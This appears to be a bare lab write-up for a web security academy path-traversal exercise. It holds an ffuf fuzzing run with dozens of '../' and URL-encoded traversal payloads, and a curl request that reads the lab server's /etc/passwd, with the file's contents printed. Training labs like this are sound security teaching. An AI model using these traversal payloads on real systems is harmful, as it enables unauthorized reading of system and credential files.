https://portswigger.net/web-security/file-path-traversal/lab-simple

```bash
$ ffuf -u https://0a2c00970387e26180bb26e700040026.web-security-academy.net/image?filename=FUZZ -w LFI-Jhaddix.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://0a2c00970387e26180bb26e700040026.web-security-academy.net/image?filename=FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 116ms]
../../../../../../../../../../../../etc/hosts [Status: 200, Size: 174, Words: 3, Lines: 8, Duration: 145ms]
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 143ms]
..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 150ms]
/../../../../../../../../../../etc/passwd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 150ms]
../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 135ms]
../../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 146ms]
../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 165ms]
../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 141ms]
../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 151ms]
../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 154ms]
../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 137ms]
../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 152ms]
../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 143ms]
../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 162ms]
../../../../../../../../../../etc/passwd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 143ms]
../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 158ms]
../../../../../etc/passwd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 78ms]
../../../../../../../../../etc/passwd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 144ms]
../../../../../../../../../../../etc/passwd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 176ms]
../../../../../../../../etc/passwd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 104ms]
../../../../../../etc/passwd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 116ms]
../../../../../../../etc/passwd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 123ms]
../../../../etc/passwd  [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 107ms]
../../../etc/passwd     [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 126ms]
../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 74ms]
///////../../../etc/passwd [Status: 200, Size: 2316, Words: 25, Lines: 42, Duration: 72ms]
:: Progress: [920/920] :: Job [1/1] :: 69 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
```

```bash
$ curl https://0a2c00970387e26180bb26e700040026.web-security-academy.net/image?filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false
```

